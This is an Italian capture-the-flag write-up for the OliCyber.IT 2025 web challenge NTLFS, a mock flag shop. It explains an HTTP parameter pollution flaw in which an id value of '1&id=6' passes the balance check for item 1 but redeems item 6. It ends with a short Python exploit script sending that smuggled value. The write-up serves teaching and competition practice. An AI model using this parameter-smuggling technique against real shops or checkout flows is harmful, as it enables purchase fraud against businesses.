# OliCyber.IT 2025 - Competizione nazionale

## [web] NTLFS (5 solves)

Ho avuto un'idea originale, dai un'occhiata al mio nuovo negozio di flag!

[https://ntlfs.challs.olicyber.it](https://ntlfs.challs.olicyber.it)

Author: Stefano Alberto <@Xato>

## Panoramica

La challenge presenta un flag shop dove è possibile acquistare bandiere tramite una richiesta POST a `/buy.php`, passando un parametro `id` che identifica la bandiera da comprare.

Il flusso di acquisto prevede un controllo sull'id, interpretato come intero, e che l'utente abbia abbastanza saldo per acquistare il prodotto. Successivamente viene generato un URL per `/add.php?id=...` che viene firmato e l'utente viene reindirizzato a quell'URL.

Per ottenere la flag l'utente deve acquistare un oggetto per il quale non ha abbastanza saldo, eludendo i controlli effettuati dall'applicazione.

## Soluzione

Analizzando e provando a modificare le richieste si può notare che il parametro `id` viene interpretato come intero nella fase di acquisto per verificare la possibilità di acquistare l'oggetto, ma successivamente viene usato direttamente per generare l'URL di redirect che viene firmato.

Se inviamo un parametro `id` che contiene caratteri speciali URL encoded, ad esempio `1%26id%3D6` (che corrisponde a `1&id=6`), il controllo per l'acquisto verificherà la possibilità di acquistare l'articolo 1 e riduce il saldo del relativo prezzo, ma l'URL generato sarà `/add.php?id=1&id=6` e la firma verrà generata su questo URL.

Quando l'utente viene reindirizzato su `/add.php?id=1&id=6`, PHP interpreterà il secondo parametro `id=6` come valore effettivo della variabile `id`, permettendoci di riscattare la bandiera con id 6 pagando solo il prezzo della bandiera 1.

## Exploit

Per sfruttare la vulnerabilità basta inviare una richiesta POST a `/buy.php` con il parametro `id=1%26id%3D6` e seguire il redirect verso `/add.php`.

```python
import requests
import re

s = requests.Session()
r = s.post(f"{CHALLENGE_URL}/login.php", data={"username": "x"})
r = s.post(f"{CHALLENGE_URL}/buy.php", data={'id':'1&id=6'})

flag = re.findall(r"flag{.*}", r.text)[0]
print(flag)
```
